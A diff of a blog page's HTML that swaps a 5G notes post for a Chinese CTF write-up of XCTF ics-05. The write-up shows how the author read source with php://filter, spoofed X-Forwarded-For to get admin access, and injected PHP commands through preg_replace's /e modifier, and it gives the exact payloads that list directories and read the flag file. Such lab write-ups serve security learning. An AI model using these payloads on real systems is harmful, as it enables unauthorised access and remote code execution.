@@ -6,20 +6,31 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>5G | cruoni的博客</title>
+  <title>XCTF ics-05 WriteUP ——php://filter  | cruoni的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="5G[toc]5G现有应用 uRLLC 超高可高低时延通信：自动驾驶 （低时延、高可靠） eMBB 增强移动宽带：VR、AR、超高清视频、云游戏 （带宽） mMTC 海量机器   NG-RAN基本结构（SA） SA/NSA架构选择  NSA优选Option 3X  相对NSA、SA对LTE现网改造更小，且便于引入5G新业务，但是投资成本高，产业进度较晚。 Cloud RAN方案选择 选择5G频谱">
-<meta name="keywords" content="机器学习 计算机视觉 信息安全">
+  <meta name="description" content="进入题目打开题目后，点点左侧的菜单栏，或者扫一下后台，可以发现/index.php页面尝试访问flag.php Not Found ,而index.php可以访问到，说明index.php存在 尝试使用php://filter读取index.php源码构造php://filter/read=convert.base64-encode/resource=index.phpBase64解码 进行简单的">
+<meta name="keywords" content="WriteUP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="5G">
-<meta property="og:url" content="http://yoursite.com/2019/08/14/5G/index.html">
+<meta property="og:title" content="XCTF ics-05 WriteUP ——php:&#x2F;&#x2F;filter ">
+<meta property="og:url" content="http://yoursite.com/2019/10/27/XCTF-ics-05-WriteUP/index.html">
 <meta property="og:site_name" content="cruoni的博客">
-<meta property="og:description" content="5G[toc]5G现有应用 uRLLC 超高可高低时延通信：自动驾驶 （低时延、高可靠） eMBB 增强移动宽带：VR、AR、超高清视频、云游戏 （带宽） mMTC 海量机器   NG-RAN基本结构（SA） SA/NSA架构选择  NSA优选Option 3X  相对NSA、SA对LTE现网改造更小，且便于引入5G新业务，但是投资成本高，产业进度较晚。 Cloud RAN方案选择 选择5G频谱">
+<meta property="og:description" content="进入题目打开题目后，点点左侧的菜单栏，或者扫一下后台，可以发现/index.php页面尝试访问flag.php Not Found ,而index.php可以访问到，说明index.php存在 尝试使用php://filter读取index.php源码构造php://filter/read=convert.base64-encode/resource=index.phpBase64解码 进行简单的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-14T08:12:06.070Z">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/fP9m3JFrYIHSy5R.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/gWz7cLd6pTnI3f8.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/SlW1CjuVgBPsyTG.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/Od2CBIePuwVqyNL.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/vKFJPiy5nEt4g92.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/DUWmYNKJH6dx1gi.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/Y2tPbqWHoMugK1Z.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/wtC6KzdoX9Fkmjr.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/SioTVrJNHkQq4vb.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/27/Z5FyaTv7dSg1s4f.png">
+<meta property="og:updated_time" content="2019-10-27T12:50:55.013Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="5G">
-<meta name="twitter:description" content="5G[toc]5G现有应用 uRLLC 超高可高低时延通信：自动驾驶 （低时延、高可靠） eMBB 增强移动宽带：VR、AR、超高清视频、云游戏 （带宽） mMTC 海量机器   NG-RAN基本结构（SA） SA/NSA架构选择  NSA优选Option 3X  相对NSA、SA对LTE现网改造更小，且便于引入5G新业务，但是投资成本高，产业进度较晚。 Cloud RAN方案选择 选择5G频谱">
+<meta name="twitter:title" content="XCTF ics-05 WriteUP ——php:&#x2F;&#x2F;filter ">
+<meta name="twitter:description" content="进入题目打开题目后，点点左侧的菜单栏，或者扫一下后台，可以发现/index.php页面尝试访问flag.php Not Found ,而index.php可以访问到，说明index.php存在 尝试使用php://filter读取index.php源码构造php://filter/read=convert.base64-encode/resource=index.phpBase64解码 进行简单的">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/27/fP9m3JFrYIHSy5R.png">
   
     <link rel="alternative" href="/atom.xml" title="cruoni的博客" type="application/atom+xml">
   
@@ -145,46 +156,37 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-5G" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-XCTF-ics-05-WriteUP" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      5G
+      XCTF ics-05 WriteUP ——php://filter 
     </h1>
   
 
         
-        <a href="/2019/08/14/5G/" class="archive-article-date">
-  	<time datetime="2019-08-14T00:59:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-14</time>
+        <a href="/2019/10/27/XCTF-ics-05-WriteUP/" class="archive-article-date">
+  	<time datetime="2019-10-27T12:03:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1><span id="5g">5G</span></h1><h2><span id="toc">[toc]</span></h2><h2><span id="5g现有应用">5G现有应用</span></h2><ol>
-<li>uRLLC 超高可高低时延通信：自动驾驶 （低时延、高可靠）</li>
-<li><strong>eMBB</strong> 增强移动宽带：VR、AR、超高清视频、云游戏 （带宽）</li>
-<li>mMTC 海量机器</li>
-</ol>
-<ul>
-<li>NG-RAN基本结构（SA）</li>
-<li>SA/NSA架构选择<br>  NSA优选Option 3X<br>  相对NSA、SA对LTE现网改造更小，且便于引入5G新业务，但是投资成本高，产业进度较晚。</li>
-<li>Cloud RAN方案选择</li>
-<li>选择5G频谱<br>  最宽的连续频谱：连续160MHz良好的覆盖性能<br>  相比3.5GHz更好的覆盖<br>  优质的产业基础：2.6GHz TD-LTE产业积累</li>
-<li>5G频段重耕</li>
-</ul>
+        <p>进入题目<br><img src="https://i.loli.net/2019/10/27/fP9m3JFrYIHSy5R.png" alt="1.png"><br>打开题目后，点点左侧的菜单栏，或者扫一下后台，可以发现/index.php页面<br>尝试访问flag.php <code>Not Found</code> ,而index.php可以访问到，说明index.php存在</p>
+<p><img src="https://i.loli.net/2019/10/27/gWz7cLd6pTnI3f8.png" alt="2.png"><br>尝试使用php://filter读取index.php源码<br>构造php://filter/read=convert.base64-encode/resource=index.php<br><img src="https://i.loli.net/2019/10/27/SlW1CjuVgBPsyTG.png" alt="3.png"><br>Base64解码 进行简单的代码审计后 找到下面这段关键代码</p>
 <ol>
-<li>Massive  MIMO 及波束管理技术<br> Massive MIMO是更大规模天线阵列的多天线形态，天线通道数显著提升</li>
-<li>多址技术 <blockquote>
-<p>1G FDMA 频分多址<br> 2G TDMA 频分 时分<br> 3G CDMA 码分多址<br> 4G OFDMA 正交频分多址<br> 多址F-OFDM技术</p>
-</blockquote>
+<li>通过修改X-FORWARDED-FOR头 获得管理员权限</li>
+<li>PHP函数 preg_replace()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line">参数说明：</span><br><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">$subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line">$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line">$count: 可选，为替换执行的次数。</span><br></pre></td></tr></table></figure>
 </li>
-<li>上下行解耦</li>
 </ol>
+<p>preg_replace($pattern, $replacement, $subject);<br>即 在 subject 中匹配 pattern 的部分， 用 replacement 进行替换。</p>
+<p><img src="https://i.loli.net/2019/10/27/Od2CBIePuwVqyNL.png" alt="4.png"></p>
+<p>修改 X-FORWARDED-FOR： 127.0.0.1<br>获得权限<br><img src="https://i.loli.net/2019/10/27/vKFJPiy5nEt4g92.png" alt="5.png"><br>PHP 的 preg_replace()函数存在一个安全问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码(在适当的逆向引用替换完之后)。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</span><br></pre></td></tr></table></figure></p>
+<p>构造 ?pat=/test/e&amp;rep=phpinfo()&amp;sub=test<br><img src="https://i.loli.net/2019/10/27/DUWmYNKJH6dx1gi.png" alt="6.png"><br>成功执行phpinfo()<br>然后构造 ?pat=/test/e&amp;rep=system(“ls”)&amp;sub=test<br>读取当前目录<br><img src="https://i.loli.net/2019/10/27/Y2tPbqWHoMugK1Z.png" alt="7.png"><br>发现可疑文件夹 s3chahahaDir<br>构造 ?pat=/test/e&amp;rep=system(“ls+s3chahahaDir”)&amp;sub=test<br><img src="https://i.loli.net/2019/10/27/wtC6KzdoX9Fkmjr.png" alt="8.png"><br>发现flag文件夹<br>构造 ?pat=/test/e&amp;rep=system(“ls+s3chahahaDir/flag”)&amp;sub=test<br><img src="https://i.loli.net/2019/10/27/SioTVrJNHkQq4vb.png" alt="9.png"><br>发现flag.php<br>构造 ?pat=/test/e&amp;rep=system(“cat+s3chahahaDir/flag/flag.php”)&amp;sub=test<br>读取flag.php<br><img src="https://i.loli.net/2019/10/27/Z5FyaTv7dSg1s4f.png" alt="10.png"><br>得到flag</p>
 
       
 
@@ -214,6 +216,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">WriteUP</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -264,7 +277,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/14/5G/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/10/27/XCTF-ics-05-WriteUP/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -278,18 +291,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/08/14/upload/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          upload 文件上传绕过方法总结
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/08/12/XCTF-攻防世界-upload/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">XCTF 攻防世界 -upload</div>
+    <a href="/2019/10/08/BUUOJ-Warmup-HCTF2018-warmup-WriteUp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">BUUOJ Warmup-HCTF2018 warmup WriteUp</div>
       <i class="icon-circle-right"></i>
     </a>
   
